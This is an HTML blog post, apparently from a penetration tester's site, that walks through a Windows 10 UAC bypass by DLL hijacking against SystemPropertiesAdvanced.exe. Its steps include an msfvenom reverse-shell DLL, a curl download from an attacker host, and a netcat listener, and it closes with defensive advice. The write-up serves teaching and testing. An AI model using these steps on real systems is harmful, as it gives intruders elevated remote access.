@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- SEO Meta Tags -->
+    <title>Windows UAC Bypass via DLL Hijacking Walkthrough | Foruth</title>
+    <meta name="description"
+        content="Technical walkthrough of UAC bypass using DLL hijacking on Windows 10. Learn how auto-elevating binaries like SystemPropertiesAdvanced.exe can be exploited to gain elevated privileges.">
+    <meta name="author" content="Pravin Mohite">
+    <link rel="canonical" href="https://foruth.github.io/posts/Windows%20UAC%20Bypass%20DLL%20Hijacking.html">
+
+    <!-- Open Graph / Social -->
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Windows UAC Bypass via DLL Hijacking Walkthrough">
+    <meta property="og:description"
+        content="Technical walkthrough of UAC bypass using DLL hijacking on Windows 10. Exploiting auto-elevating binaries to gain elevated privileges.">
+    <meta property="og:url" content="https://foruth.github.io/posts/Windows%20UAC%20Bypass%20DLL%20Hijacking.html">
+    <meta property="og:image" content="https://foruth.github.io/img/og-uac-bypass.png">
+    <meta property="article:published_time" content="2025-12-08T09:00:00Z">
+    <meta property="article:author" content="Pravin Mohite">
+    <meta property="article:tag" content="Windows Security">
+    <meta property="article:tag" content="UAC Bypass">
+    <meta property="article:tag" content="DLL Hijacking">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Windows UAC Bypass via DLL Hijacking Walkthrough">
+    <meta name="twitter:description"
+        content="Learn how to bypass UAC using DLL hijacking on Windows 10 through auto-elevating binaries.">
+    <meta name="twitter:image" content="https://foruth.github.io/img/og-uac-bypass.png">
+
+    <!-- Structured Data (Article Schema) -->
+    <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "Windows UAC Bypass via DLL Hijacking Walkthrough",
+    "description": "Technical walkthrough of UAC bypass using DLL hijacking on Windows 10. Learn how auto-elevating binaries like SystemPropertiesAdvanced.exe can be exploited to gain elevated privileges.",
+    "image": "https://foruth.github.io/img/og-uac-bypass.png",
+    "author": {
+      "@type": "Person",
+      "name": "Pravin Mohite"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Foruth Security Blog",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://foruth.github.io/img/logo.png"
+      }
+    },
+    "datePublished": "2025-12-08",
+    "dateModified": "2025-12-08"
+  }
+  </script>
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Merriweather:wght@400;700&family=Fira+Code:wght@400;500&display=swap"
+        rel="stylesheet">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: ['class', '[data-theme="dark"]'],
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+                        serif: ['Merriweather', 'Georgia', 'serif'],
+                        mono: ['Fira Code', 'Monaco', 'Consolas', 'monospace'],
+                    },
+                }
+            }
+        }
+    </script>
+
+    <!-- Custom Styles -->
+    <link rel="stylesheet" href="../css/custom.css">
+
+    <!-- Prism.js for Syntax Highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+
+    <!-- RSS Feed -->
+    <link rel="alternate" type="application/rss+xml" title="Security Research RSS Feed" href="../rss.xml">
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="../img/favicon.ico">
+</head>
+
+<body class="bg-white dark:bg-slate-900 text-slate-800 dark:text-slate-100 min-h-screen transition-colors duration-200">
+
+    <!-- Skip Link -->
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <!-- HEADER / NAVIGATION (same structure as index.html) -->
+    <header
+        class="sticky top-0 z-50 bg-white/80 dark:bg-slate-900/80 backdrop-blur-md border-b border-slate-200 dark:border-slate-700">
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+
+                <!-- Logo -->
+                <a href="../index.html"
+                    class="flex items-center gap-2 text-xl font-bold text-slate-900 dark:text-white hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">
+                    <img src="../img/logo.png" alt="Foruth Logo" class="w-8 h-8">
+                    <span>Foruth</span>
+                </a>
+
+                <!-- Navigation -->
+                <nav class="hidden md:flex items-center gap-8 text-sm">
+                    <a href="../index.html"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">Home</a>
+                    <a href="#"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">About</a>
+                    <a href="#"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">Archive</a>
+                    <a href="../rss.xml"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">RSS</a>
+                </nav>
+
+                <!-- Search & Theme Toggle -->
+                <div class="flex items-center gap-2">
+                    <button id="search-toggle" class="theme-toggle" aria-label="Search" title="Search (Ctrl+K)">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                        </svg>
+                    </button>
+                    <button id="theme-toggle" class="theme-toggle" aria-label="Toggle dark mode"
+                        title="Toggle dark mode">
+                        <svg class="icon-sun w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z">
+                            </path>
+                        </svg>
+                        <svg class="icon-moon w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z">
+                            </path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <main id="main-content" class="max-w-5xl mx-auto px-4 sm:px-6 py-10">
+
+        <!-- Hero -->
+        <section class="mb-10">
+            <div class="mb-6 rounded-2xl overflow-hidden shadow-sm border border-slate-200 dark:border-slate-800">
+                <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200&h=400&fit=crop"
+                    alt="Security and system access concept" width="1200" height="400" loading="eager"
+                    class="w-full h-auto object-cover">
+            </div>
+
+            <div class="flex flex-wrap gap-2 mb-4">
+                <span class="tag-chip">Windows Security</span>
+                <span class="tag-chip">UAC Bypass</span>
+                <span class="tag-chip">DLL Hijacking</span>
+            </div>
+
+            <h1 class="font-serif text-3xl sm:text-4xl md:text-5xl font-bold text-slate-900 dark:text-white mb-4">
+                Windows UAC Bypass via DLL Hijacking Walkthrough
+            </h1>
+
+            <section class="not-prose mt-4">
+                <div class="author-box">
+                    <img src="../img/avatar.png" alt="Pravin Mohite" class="author-box__avatar" width="64" height="64">
+                    <div>
+                        <p class="author-box__name">Pravin Mohite</p>
+                        <div
+                            class="mt-2 flex flex-wrap items-center gap-3 text-xs sm:text-sm text-slate-500 dark:text-slate-400">
+                            <time datetime="2025-12-08">December 8, 2025</time>
+                            <span>•</span>
+                            <span>10 min read</span>
+                            <span>•</span>
+                            <span class="inline-flex items-center gap-1">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                                </svg>
+                                <span class="js-visitor-count">--</span>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+        </section>
+
+        <!-- Article Body -->
+        <article class="prose prose-slate dark:prose-invert max-w-none">
+
+            <h2 id="overview">Overview</h2>
+            <p>
+                This walkthrough demonstrates a User Account Control (UAC) bypass attack using DLL hijacking on
+                Windows 10. The technique exploits an auto-elevating binary
+                <code>SystemPropertiesAdvanced.exe</code>
+                that attempts to load a missing DLL <code>srrstr.dll</code>. By placing a malicious DLL in a
+                writable PATH directory, we can execute code with elevated privileges when the binary runs.
+            </p>
+
+            <div class="not-prose my-6 p-4 bg-amber-50 dark:bg-amber-900/20 border-l-4 border-amber-500 rounded-r-lg">
+                <p class="text-amber-800 dark:text-amber-200 text-sm">
+                    <strong>⚠️ Educational Purpose Only:</strong>
+                    This walkthrough is for educational purposes in controlled environments only.
+                    Always obtain proper authorization before testing security vulnerabilities.
+                </p>
+            </div>
+
+            <h2 id="prerequisites">Prerequisites &amp; Requirements</h2>
+
+            <h3 id="target-environment">1. Target Environment</h3>
+            <ul>
+                <li>Windows 10 build 14393 (Version 1607) or compatible version</li>
+                <li>User account must be member of local Administrators group</li>
+                <li>UAC enabled (<code>EnableLUA</code> = 1) but NOT set to "Always notify" (0x5)</li>
+                <li>32-bit <code>SystemPropertiesAdvanced.exe</code> present
+                    (<code>C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</code>)
+                </li>
+            </ul>
+
+            <h3 id="attacker-requirements">2. Attacker Requirements</h3>
+            <ul>
+                <li>Write access to a directory in system PATH (typically
+                    <code>C:\Users&lt;username&gt;\AppData\Local\Microsoft\WindowsApps\</code>)
+                </li>
+                <li>Ability to download/transfer files to target</li>
+                <li>Listener for reverse shell connection</li>
+            </ul>
+
+            <h3 id="validation-commands">3. Quick Validation Commands</h3>
+            <p>Before proceeding, verify these conditions on the target:</p>
+
+            <pre><code class="language-powershell"># Check if user is in Administrators group
+whoami
+net localgroup administrators
+
+# Check UAC status
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+
+# Check UAC level (should not be 0x5)
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+
+# Check Windows version
+[environment]::OSVersion.Version
+
+# Check PATH for writable directories
+cmd /c echo %PATH%</code></pre>
+
+            <h2 id="attack-steps">Attack Steps</h2>
+
+            <h3 id="step1">Step 1: Verify Target Conditions</h3>
+            <p>Confirm the target user has administrator privileges and UAC is configured appropriately:</p>
+
+            <pre><code class="language-powershell">whoami /groups
+# Look for "Administrators" group in output
+
+net localgroup administrators
+# Confirm your username appears in members list
+
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+# Should return 0x1 (enabled)
+
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+# Should NOT return 0x5 (Always notify)</code></pre>
+
+            <h3 id="step2">Step 2: Generate Malicious DLL</h3>
+            <p>On your attacker machine, create a reverse shell DLL using msfvenom:</p>
+
+            <pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;YOUR_IP&gt; LPORT=8443 -f dll &gt; srrstr.dll</code></pre>
+
+            <p>Replace <code>&lt;YOUR_IP&gt;</code> with your attacker IP address.</p>
+
+            <h3 id="step3">Step 3: Host the DLL</h3>
+            <p>Set up a simple HTTP server to serve the malicious DLL:</p>
+
+            <pre><code class="language-bash">sudo python3 -m http.server 8080</code></pre>
+
+            <h3 id="step4">Step 4: Download DLL to Target</h3>
+            <p>On the target machine (with existing access/shell), download the DLL to a writable PATH directory:</p>
+
+            <pre><code class="language-powershell">curl http://&lt;ATTACKER_IP&gt;:8080/srrstr.dll -O "C:\Users\&lt;USERNAME&gt;\AppData\Local\Microsoft\WindowsApps\srrstr.dll"</code></pre>
+
+            <h3 id="step5">Step 5: Set Up Listener</h3>
+            <p>On your attacker machine, start a netcat listener:</p>
+
+            <pre><code class="language-bash">nc -lvnp 8443</code></pre>
+
+            <h3 id="step6">Step 6: Test DLL Execution (Optional)</h3>
+            <p>Before the full bypass, test that the DLL works by executing it normally:</p>
+
+            <pre><code class="language-powershell">rundll32 shell32.dll,Control_RunDLL C:\Users\&lt;USERNAME&gt;\AppData\Local\Microsoft\WindowsApps\srrstr.dll</code></pre>
+
+            <p>This should give you a reverse shell with standard user privileges. Kill this connection before
+                proceeding.</p>
+
+            <h3 id="step7">Step 7: Execute UAC Bypass</h3>
+            <p>Trigger the UAC bypass by running the auto-elevating binary:</p>
+
+            <pre><code class="language-powershell">C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</code></pre>
+
+            <h3 id="step8">Step 8: Receive Elevated Shell</h3>
+            <p>Your netcat listener should receive an elevated reverse shell. Verify the privileges:</p>
+
+            <pre><code class="language-powershell">whoami /priv
+# Should show extensive privileges now available</code></pre>
+
+            <h2 id="troubleshooting">Key Points &amp; Troubleshooting</h2>
+
+            <h3>Important Notes</h3>
+            <ul>
+                <li>This technique only works if the user is already in the Administrators group</li>
+                <li>UAC must be enabled but not at the highest security level</li>
+                <li>The attack relies on the specific Windows build (14393/1607)</li>
+                <li>Always test the DLL separately first to avoid issues</li>
+            </ul>
+
+            <h3>Common Issues &amp; Solutions</h3>
+            <ul>
+                <li><strong>No shell received:</strong> Check firewall rules, ensure correct IP/port in payload</li>
+                <li><strong>Access denied when downloading:</strong> Verify write permissions to
+                    <code>WindowsApps</code> directory
+                </li>
+                <li><strong>UAC prompt appears:</strong> The UAC level might be set too high (0x5)</li>
+                <li><strong>Binary not found:</strong> Verify
+                    <code>C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</code> exists
+                </li>
+            </ul>
+
+            <h3>Cleanup</h3>
+            <p>After successful exploitation, remember to remove the malicious DLL:</p>
+
+            <pre><code class="language-powershell">Remove-Item "C:\Users\&lt;USERNAME&gt;\AppData\Local\Microsoft\WindowsApps\srrstr.dll"</code></pre>
+
+            <h2 id="mechanism">Understanding the Mechanism</h2>
+
+            <h3>Why This Works</h3>
+            <ol>
+                <li><code>SystemPropertiesAdvanced.exe</code> is configured for auto-elevation</li>
+                <li>It attempts to load <code>srrstr.dll</code> (which doesn't exist by default)</li>
+                <li>Windows searches for DLLs in PATH directories</li>
+                <li>The <code>WindowsApps</code> directory is both in PATH and user-writable</li>
+                <li>Our malicious DLL gets loaded with elevated privileges</li>
+            </ol>
+
+            <h3>Security Implications</h3>
+            <ul>
+                <li>UAC is not a security boundary but a convenience feature</li>
+                <li>Auto-elevating binaries create potential bypass vectors</li>
+                <li>Writable PATH directories increase attack surface</li>
+                <li>Regular users in Administrators group increases risk</li>
+            </ul>
+
+            <h2 id="conclusion">Conclusion</h2>
+            <p>
+                This UAC bypass technique demonstrates how the combination of auto-elevating binaries, missing DLLs,
+                and writable PATH directories can be exploited to gain elevated privileges. While UAC provides a
+                layer of protection, it should not be relied upon as a security boundary.
+            </p>
+
+            <p>
+                Defenders should consider implementing application whitelisting, restricting write access to PATH
+                directories, and monitoring for suspicious DLL loading behavior to mitigate these types of attacks.
+            </p>
+
+            <section class="not-prose mt-10 pt-6 border-t border-slate-200 dark:border-slate-800">
+                <div class="author-box">
+                    <img src="../img/avatar.png" alt="Pravin Mohite" class="author-box__avatar" width="64" height="64">
+                    <div>
+                        <p class="author-box__name">Pravin Mohite</p>
+                        <p class="author-box__bio">
+                            Penetration Tester & Cybersecurity Engineer. Preparing for CPTS & OSCP.
+                            Specializing in vulnerability research, CTF-style lab creation, and offensive security.
+                        </p>
+                    </div>
+                </div>
+            </section>
+
+        </article>
+
+    </main>
+
+    <!-- ============================================
+       FOOTER
+  ============================================ -->
+    <footer class="mt-16 border-t border-slate-200 dark:border-slate-800 bg-white/80 dark:bg-slate-900/80">
+        <div class="max-w-5xl mx-auto px-4 sm:px-6 py-10 space-y-8">
+
+            <!-- Links & Social -->
+            <div class="flex flex-col sm:flex-row items-center justify-between gap-6 text-sm">
+                <nav class="flex flex-wrap items-center justify-center gap-4 text-slate-600 dark:text-slate-400">
+                    <a href="../index.html"
+                        class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Home</a>
+                    <span class="hidden sm:inline text-slate-300 dark:text-slate-600">|</span>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">About</a>
+                    <span class="hidden sm:inline text-slate-300 dark:text-slate-600">|</span>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Archive</a>
+                    <span class="hidden sm:inline text-slate-300 dark:text-slate-600">|</span>
+                    <a href="../rss.xml" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">RSS
+                        Feed</a>
+                </nav>
+
+                <div class="flex items-center justify-center gap-4 text-slate-500">
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors"
+                        aria-label="GitHub">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path
+                                d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors"
+                        aria-label="Twitter">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path
+                                d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors"
+                        aria-label="LinkedIn">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path
+                                d="M20.5 2h-17A1.5 1.5 0 002 3.5v17A1.5 1.5 0 003.5 22h17a1.5 1.5 0 001.5-1.5v-17A1.5 1.5 0 0020.5 2zM8 19H5v-9h3zM6.5 8.25A1.75 1.75 0 118.3 6.5a1.78 1.78 0 01-1.8 1.75zM19 19h-3v-4.74c0-1.42-.6-1.93-1.38-1.93A1.74 1.74 0 0013 14.19a.66.66 0 000 .14V19h-3v-9h2.9v1.3a3.11 3.11 0 012.7-1.4c1.55 0 3.36.86 3.36 3.66z" />
+                        </svg>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Copyright -->
+            <div class="border-t border-slate-200 dark:border-slate-800 pt-4 text-center text-xs text-slate-500">
+                <p> 2025 Pravin Mohite. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Search Modal -->
+    <div id="search-modal" class="search-modal hidden" role="dialog" aria-modal="true" aria-labelledby="search-title">
+        <div class="search-modal__backdrop"></div>
+        <div class="search-modal__container">
+            <div class="search-modal__content">
+                <div class="search-modal__header">
+                    <div class="search-modal__input-wrapper">
+                        <svg class="search-modal__icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                        </svg>
+                        <input type="text" id="search-input" class="search-modal__input" placeholder="Search posts..."
+                            autocomplete="off" autofocus>
+                        <kbd class="search-modal__kbd">ESC</kbd>
+                    </div>
+                </div>
+                <div id="search-results" class="search-modal__results">
+                    <p class="search-modal__hint">Type to search posts by title, content, or tags...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="../js/main.js"></script>
+
+    <!-- Prism.js for Syntax Highlighting -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script
+        src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+</body>
+
+</html>
